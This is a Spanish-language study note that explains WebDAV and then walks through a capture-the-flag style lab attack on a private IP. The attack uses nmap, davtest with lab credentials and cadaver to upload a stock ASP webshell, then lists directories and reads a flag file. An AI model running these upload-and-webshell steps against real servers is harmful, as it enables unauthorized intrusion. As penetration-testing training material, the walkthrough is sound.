Web Distributed Authoring and Versioning (Autoría y Versionado Distribuido en la Web), es un conjunto de extensiones del protocolo HTTP diseñado para permitir la edición remota y la gestión de archivos en servidores web. Fue desarrollado para facilitar la colaboración en línea y la gestión de contenido web.

WebDAV extiende las funcionalidades básicas del protocolo HTTP para permitir operaciones como la creación, modificación y eliminación de archivos y directorios en un servidor web remoto. Además, proporciona mecanismos para el bloqueo de archivos, la gestión de propiedades de recursos web y el control de versiones, lo que lo hace útil para entornos donde se requiere colaboración en la edición de documentos y archivos.

Algunas aplicaciones comunes de WebDAV incluyen la edición colaborativa de documentos, la sincronización de archivos entre dispositivos y la integración de sistemas de gestión de contenido (CMS) con servidores web. WebDAV es compatible con una variedad de sistemas operativos y aplicaciones, lo que lo convierte en una herramienta versátil para la gestión de contenido en línea.


# Ejemplo practico
Lo primero que haremos sera hacer un escaner del host a explotar
nmap -sv -sC 10.2.20.83
![[Pasted image 20240307115652.png]]

Una vez visto el protocolo a explotar, utilizaremos un script de namp
nmap -sV -p 80 --script http-enum [IP]
![[Pasted image 20240307115907.png]]

Como podemos ver tiene autenticación para poder continuar explotando el protocolo http necesitaremos las credenciales, porque si intentamos acceder nos solicitara el usuario y la password
![[Pasted image 20240307120308.png]]

Si pudiésemos acceder se nos desplegaría la siguiente pagina
![[Pasted image 20240307120356.png]]

Continuando con el ataque utilizaremos la herramienta davtest para comprobar si los servidores están habilitados para poder subir nuestro payload y poder acceder al servidor

davtest -url http://10.2.20.83/webdav
![[Pasted image 20240307121012.png]]

Como podemos ver nos ha fallado por que esta habilitada la autenticación, para poder acceder tendremos que usar el usuario y la contraseña

davtest -auth bob:password_123321 -url http://10.2.20.83/webdav
![[Pasted image 20240307121455.png]]
![[Pasted image 20240307121520.png]]

Una vez comprobado que podemos subir archivos y tenemos la ruta con la herramienta de cadaver accederemos a la ruta y subiremos el archivo .asp backdoor

Accedemos dentro de la ruta con cadaver
cadaver http://10.2.20.83/webdev
![[Pasted image 20240307122029.png]]

Subimos el archivo
put /usr/share/webshells/asp/webshell.asp
![[Pasted image 20240307122153.png]]

Como podemos ver el archivos se ha subido, accedemos al directorio
![[Pasted image 20240307122322.png]]

Entramos en webshell.asp y ya estariamos dentro del terminal, ahora podriamos escribir todos los comandos estando dentro del equipo, en la siguiente imagen vemos que hemos mirado que usuario somos y nos lo ha mostrado por pantalla
![[Pasted image 20240307122432.png]]

Ejecutamos el siguiente comando para listar directorios
dir C:\
![[Pasted image 20240307122619.png]]

Ahora ejecutamos el siguiente comando para listar la bandera
type C:\flag.txt
![[Pasted image 20240307122921.png]]





